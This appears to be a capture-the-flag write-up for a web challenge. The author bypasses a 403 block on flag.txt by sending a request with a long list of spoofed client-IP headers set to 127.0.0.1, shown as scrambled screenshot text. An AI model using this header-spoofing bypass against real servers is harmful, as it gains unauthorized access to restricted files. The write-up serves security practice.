# README
> Read me if you can!!

## About the Challenge
We got a website without the source code, and on this website, we need to read the `flag.txt` file to obtain the flag.


[Image extracted text: Read
Enter anything
Read
flag txt
text txt]


In this case, we can't directly read the `flag.txt` file. Instead, we can only read the `text.txt` file.


[Image extracted text: Read
text txt
Read
Yes! You can read files! Dont ask for hint its ezzl!]



[Image extracted text: Read
txt
Read
403 Access Denied
flag t]


## How to Solve?
At first, I thought we need to read the flag using a Path Traversal vulnerability. However, in order to access the flag, we must first bypass the 403 restriction by adding an HTTP proxy header


[Image extracted text: Request
Response
Pretty
Raw
Hex
6
In
=
Pretty
Raw
Hex
Render
GET
Ifetch?file-flag_
txt
HTTP/1.0
HTTP/1.0
200
OK
2
Host
127.0.0.1
2 Content-Type
application/json
3 X-Originating-IP:
127.0.0.1
3 Content-Length:
34
X-Forwarded-For:
127.0.0.1
Server:
Werkzeug/2.0.3 Python/3.6.15
5
X-Forwarded:
127
0 .
0.1
5
Date:
Sun,
21
Jan
2024
14:31:02
GMT
6
Forwarded-For:
127.0.0.1
6
X-Remote-IP:
127.0.0.1
8
X-Remote-Addr:
127.0.0.1
result"
KCTF{kudoSw3lld0n3 !}"
X-ProxyUser-Ip:
127.0.0.1
10 X-Original-URL:
127.0.0.1
11
Client-IP:
127.
0.0.1
12
True-Client-IP:
127.0.0.1
13
Cluster-Client-IP:
127.0.0.1
14
X-ProxyUser-Ip:
127.0.0.1
15
16]


```
KCTF{kud05w3lld0n3!}
```